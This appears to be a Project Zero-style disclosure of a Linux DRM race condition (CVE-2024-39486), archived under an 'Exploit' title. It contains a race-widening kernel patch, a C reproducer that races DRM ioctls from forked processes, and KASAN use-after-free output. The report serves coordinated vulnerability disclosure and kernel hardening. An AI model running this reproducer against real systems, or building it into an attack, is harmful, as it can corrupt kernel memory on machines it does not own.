@@ -1,0 +1,284 @@
+id: 39698
+date: 08/07/2024
+title: Linux DRM drm_file_update_pid() Race Condition / Use-After-Free Exploit
+author: Jann Horn
+cves: CVE-2024-39486
+
+Linux: DRM: refcount incremented too late in drm_file_update_pid()
+
+[I am sending this to security@ and to the drm-misc maintainers - based on https://drm.pages.freedesktop.org/maintainer-tools/committer-drm-misc.html#merge-criteria I think this falls into drm-misc's area of responsibility?]
+
+=== summary ===
+drm_file_update_pid() calls get_pid() too late, which creates a race
+condition that can lead to use-after-free of a `struct pid`.
+
+I will send a suggested patch off-list in a minute; let me know if you want me to resend it on the dri-devel list in case that works better for you.
+
+
+
+=== verbose bug report ===
+drm_file_update_pid() contains the following code:
+
+```
+  struct drm_device *dev;
+  struct pid *pid, *old;
+
+  /*
+   * Master nodes need to keep the original ownership in order for
+   * drm_master_check_perm to keep working correctly. (See comment in
+   * drm_auth.c.)
+   */
+  if (filp->was_master)
+          return;
+
+  pid = task_tgid(current);
+
+  [...]
+
+  dev = filp->minor->dev;
+  mutex_lock(&dev->filelist_mutex);
+  old = rcu_replace_pointer(filp->pid, pid, 1);
+  mutex_unlock(&dev->filelist_mutex);
+
+  if (pid != old) {
+          get_pid(pid);
+          synchronize_rcu();
+          put_pid(old);
+  }
+```
+
+filp->pid is a refcounted pointer which can only be modified under
+dev->filelist_mutex.
+After calling rcu_replace_pointer(), we have a refcount debt of 1, which is
+still fine because we're holding the mutex that prevents other tasks from
+taking ownership of the reference stored in filp->pid; but by the time we drop
+this mutex, we must have called get_pid() to make up for this refcount debt,
+and that isn't done.
+
+
+So a use-after-free can occur in the following scenario, assuming filp->pid
+initially points to the pid of process A and process B's initial pid refcount
+is 1:
+
+
+process A               process B
+=========               =========
+                        begin drm_file_update_pid
+                        mutex_lock(&dev->filelist_mutex)
+                        rcu_replace_pointer(filp->pid, <pid B>, 1)
+                        mutex_unlock(&dev->filelist_mutex)
+begin drm_file_update_pid
+mutex_lock(&dev->filelist_mutex)
+rcu_replace_pointer(filp->pid, <pid A>, 1)
+mutex_unlock(&dev->filelist_mutex)
+get_pid(<pid A>)
+synchronize_rcu()
+put_pid(<pid B>)   *** pid B reaches refcount 0 and is freed here ***
+                        get_pid(<pid B>)   *** UAF ***
+                        synchronize_rcu()
+                        put_pid(<pid A>)
+
+
+Note that this race can only occur if RCU is configured so that
+running in preemptible task context can count as an RCU quiescent state.
+My testcase assumes that the kernel is configured for full preemption (meaning
+either CONFIG_PREEMPT=y or CONFIG_PREEMPT_DYNAMIC=y with full preemption
+selected at boot time); however, I think in theory the bug can probably be
+hit as long as CONFIG_PREEMPT_RCU=y is enabled (which is the case on kernel
+builds with dynamic preemption), since I think on such builds, expedited grace
+periods can still detect RCU quiescent states with IPIs.
+
+
+My reproducer also requires that you patch the following code into the kernel
+to slow down execution and make the bug easy to trigger:
+
+```
+diff --git a/drivers/gpu/drm/drm_file.c b/drivers/gpu/drm/drm_file.c
+index 638ffa4444f5..03e7711e9744 100644
+--- a/drivers/gpu/drm/drm_file.c
++++ b/drivers/gpu/drm/drm_file.c
+@@ -38,6 +38,7 @@
+ #include <linux/pci.h>
+ #include <linux/poll.h>
+ #include <linux/slab.h>
++#include <linux/delay.h>
+
+ #include <drm/drm_client.h>
+ #include <drm/drm_drv.h>
+@@ -472,6 +473,12 @@ void drm_file_update_pid(struct drm_file *filp)
+        old = rcu_replace_pointer(filp->pid, pid, 1);
+        mutex_unlock(&dev->filelist_mutex);
+
++       if (strcmp(current->comm, \"SLOWME\") == 0) {
++               pr_warn(\"%s: BEGIN DELAY\
+\", __func__);
++               mdelay(1000);
++               pr_warn(\"%s: END DELAY\
+\", __func__);
++       }
++
+        if (pid != old) {
+                get_pid(pid);
+                synchronize_rcu();
+```
+
+
+The reproducer code:
+```
+#include <unistd.h>
+#include <stdio.h>
+#include <err.h>
+#include <fcntl.h>
+#include <stdlib.h>
+#include <sys/signal.h>
+#include <sys/ioctl.h>
+#include <sys/prctl.h>
+#include <sys/wait.h>
+#include <drm/drm.h>
+
+#define SYSCHK(x) ({          \\
+  typeof(x) __res = (x);      \\
+  if (__res == (typeof(x))-1) \\
+    err(1, \"SYSCHK(\" #x \")\"); \\
+  __res;                      \\
+})
+
+static void main_test_code() {
+  struct drm_version dummy_version;
+
+  int drm_fd = SYSCHK(open(\"/dev/dri/renderD128\", O_RDONLY));
+  int child = SYSCHK(fork());
+
+  if (child == 0) {
+    /* child process */
+    prctl(PR_SET_NAME, \"SLOWME\");
+    ioctl(drm_fd, DRM_IOCTL_VERSION, &dummy_version); // delay injected here
+  } else {
+    /* parent process */
+    usleep(200*1000);
+    ioctl(drm_fd, DRM_IOCTL_VERSION, &dummy_version);
+  }
+
+  if (child == 0) {
+    /* child process */
+    exit(0);
+  } else {
+    /* parent process */
+    int status = 0;
+    pid_t child = wait(&status);
+    printf(\"wait() returned %d, status %d\
+\", child, status);
+    exit(0);
+  }
+}
+
+int main(void) {
+  // run in a child process to avoid extra references from job control or such
+  int child = SYSCHK(fork());
+  if (child == 0) {
+    prctl(PR_SET_PDEATHSIG, SIGKILL);
+    main_test_code();
+  } else {
+    int status = 0;
+    pid_t child = wait(&status);
+    printf(\"wait() returned %d, status %d\
+\", child, status);
+  }
+}
+```
+
+
+The resulting KASAN splat (tested on mainline plus the race widener patch
+above, with CONFIG_PREEMPT=y and CONFIG_KASAN=y):
+```
+ ==================================================================
+ BUG: KASAN: slab-use-after-free in drm_file_update_pid (./arch/x86/include/asm/atomic.h:93 (discriminator 4) ./include/linux/atomic/atomic-arch-fallback.h:749 (discriminator 4) ./include/linux/atomic/atomic-instrumented.h:253 (discriminator 4) ./include/linux/refcount.h:184 (discriminator 4) ./include/linux/refcount.h:241 (discriminator 4) ./include/linux/refcount.h:258 (discriminator 4) ./include/linux/pid.h:84 (discriminator 4) ./include/linux/pid.h:81 (discriminator 4) drivers/gpu/drm/drm_file.c:483 (discriminator 4))
+ Write of size 4 at addr ffff88811f2f68c0 by task SLOWME/1092
+
+ CPU: 3 PID: 1092 Comm: SLOWME Not tainted 6.10.0-rc5-00035-gafcd48134c58-dirty #384
+ Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+ Call Trace:
+  <TASK>
+ dump_stack_lvl (lib/dump_stack.c:117)
+ print_report (mm/kasan/report.c:378 mm/kasan/report.c:488)
+ kasan_report (mm/kasan/report.c:603)
+ kasan_check_range (mm/kasan/generic.c:175 (discriminator 1) mm/kasan/generic.c:189 (discriminator 1))
+ drm_file_update_pid (./arch/x86/include/asm/atomic.h:93 (discriminator 4) ./include/linux/atomic/atomic-arch-fallback.h:749 (discriminator 4) ./include/linux/atomic/atomic-instrumented.h:253 (discriminator 4) ./include/linux/refcount.h:184 (discriminator 4) ./include/linux/refcount.h:241 (discriminator 4) ./include/linux/refcount.h:258 (discriminator 4) ./include/linux/pid.h:84 (discriminator 4) ./include/linux/pid.h:81 (discriminator 4) drivers/gpu/drm/drm_file.c:483 (discriminator 4))
+ drm_ioctl_kernel (./include/drm/drm_drv.h:510 drivers/gpu/drm/drm_ioctl.c:737)
+ drm_ioctl (drivers/gpu/drm/drm_ioctl.c:842)
+ __x64_sys_ioctl (fs/ioctl.c:51 fs/ioctl.c:912 fs/ioctl.c:898 fs/ioctl.c:898)
+ do_syscall_64 (arch/x86/entry/common.c:52 (discriminator 1) arch/x86/entry/common.c:83 (discriminator 1))
+ entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:130)
+[...]
+  </TASK>
+
+ Allocated by task 1091:
+ kasan_save_stack (mm/kasan/common.c:48)
+ kasan_save_track (./arch/x86/include/asm/current.h:49 (discriminator 1) mm/kasan/common.c:60 (discriminator 1) mm/kasan/common.c:69 (discriminator 1))
+ __kasan_slab_alloc (mm/kasan/common.c:312 mm/kasan/common.c:338)
+ kmem_cache_alloc_noprof (./include/linux/kasan.h:201 mm/slub.c:3940 mm/slub.c:4002 mm/slub.c:4009)
+ alloc_pid (kernel/pid.c:187)
+ copy_process (kernel/fork.c:2406)
+ kernel_clone (./include/linux/random.h:26 kernel/fork.c:2798)
+ __do_sys_clone (kernel/fork.c:2929)
+ do_syscall_64 (arch/x86/entry/common.c:52 (discriminator 1) arch/x86/entry/common.c:83 (discriminator 1))
+ entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:130)
+
+ Freed by task 1091:
+ kasan_save_stack (mm/kasan/common.c:48)
+ kasan_save_track (./arch/x86/include/asm/current.h:49 (discriminator 1) mm/kasan/common.c:60 (discriminator 1) mm/kasan/common.c:69 (discriminator 1))
+ kasan_save_free_info (mm/kasan/generic.c:582 (discriminator 1))
+ poison_slab_object (mm/kasan/common.c:242)
+ __kasan_slab_free (mm/kasan/common.c:256 (discriminator 1))
+ kmem_cache_free (mm/slub.c:4438 (discriminator 3) mm/slub.c:4513 (discriminator 3))
+ put_pid.part.0 (kernel/pid.c:122)
+ drm_ioctl_kernel (./include/drm/drm_drv.h:510 drivers/gpu/drm/drm_ioctl.c:737)
+ drm_ioctl (drivers/gpu/drm/drm_ioctl.c:842)
+ __x64_sys_ioctl (fs/ioctl.c:51 fs/ioctl.c:912 fs/ioctl.c:898 fs/ioctl.c:898)
+ do_syscall_64 (arch/x86/entry/common.c:52 (discriminator 1) arch/x86/entry/common.c:83 (discriminator 1))
+ entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:130)
+
+ The buggy address belongs to the object at ffff88811f2f68c0
+  which belongs to the cache pid of size 240
+ The buggy address is located 0 bytes inside of
+  freed 240-byte region [ffff88811f2f68c0, ffff88811f2f69b0)
+
+ The buggy address belongs to the physical page:
+ page: refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x11f2f6
+ head: order:1 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
+ flags: 0x200000000000040(head|node=0|zone=2)
+ page_type: 0xffffefff(slab)
+ raw: 0200000000000040 ffff888106686a00 dead000000000122 0000000000000000
+ raw: 0000000000000000 0000000080190019 00000001ffffefff 0000000000000000
+ head: 0200000000000040 ffff888106686a00 dead000000000122 0000000000000000
+ head: 0000000000000000 0000000080190019 00000001ffffefff 0000000000000000
+ head: 0200000000000001 ffffea00047cbd81 ffffffffffffffff 0000000000000000
+ head: 0000000000000002 0000000000000000 00000000ffffffff 0000000000000000
+ page dumped because: kasan: bad access detected
+
+ Memory state around the buggy address:
+  ffff88811f2f6780: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+  ffff88811f2f6800: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fc fc
+ >ffff88811f2f6880: fc fc fc fc fc fc fc fc fa fb fb fb fb fb fb fb
+                                            ^
+  ffff88811f2f6900: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+  ffff88811f2f6980: fb fb fb fb fb fb fc fc fc fc fc fc fc fc fc fc
+ ==================================================================
+```
+
+
+
+=== disclosure deadline ===
+This bug is subject to a 90-day disclosure deadline. If a fix for this
+issue is made available to users before the end of the 90-day deadline,
+this bug report will become public 30 days after the fix was made
+available. Otherwise, this bug report will become public at the deadline.
+The scheduled deadline is 2024-09-25.
+
+For more details, see the Project Zero vulnerability disclosure policy:
+https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-
+policy.html
+
+Related CVE Numbers: CVE-2024-39486.
+
+#  0day.today [2024-08-12]  #
